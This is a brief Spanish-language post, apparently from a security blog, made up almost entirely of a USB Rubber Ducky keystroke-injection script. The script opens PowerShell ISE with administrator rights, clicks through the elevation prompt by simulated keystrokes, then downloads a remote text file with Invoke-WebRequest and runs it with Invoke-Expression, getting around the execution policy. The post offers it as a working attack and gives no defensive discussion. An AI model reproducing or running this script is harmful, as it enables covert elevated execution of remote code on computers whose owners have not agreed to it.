# Descargar y ejecutar un script sin cambiar la directiva de ejecución
## Ducky scripts, PowerShell, Security 
### URL: https://www.jesusninoc.com/2015/01/09/descargar-y-ejecutar-un-script-sin-cambiar-la-directiva-de-ejecucion/
```PowerShell
DELAY 750
GUI r
DELAY 750
STRING powershell Start-Process powershell_ise -Verb runAs
ENTER
DELAY 2050
ALT s
DELAY 2050
ENTER
CTRL R
ENTER
CTRL I
STRING $script=Invoke-WebRequest 'https://www.jesusninoc.com/wp-content/uploads/2014/12/config.txt'
ENTER
STRING Invoke-Expression $script
DELAY 2050
F5

```
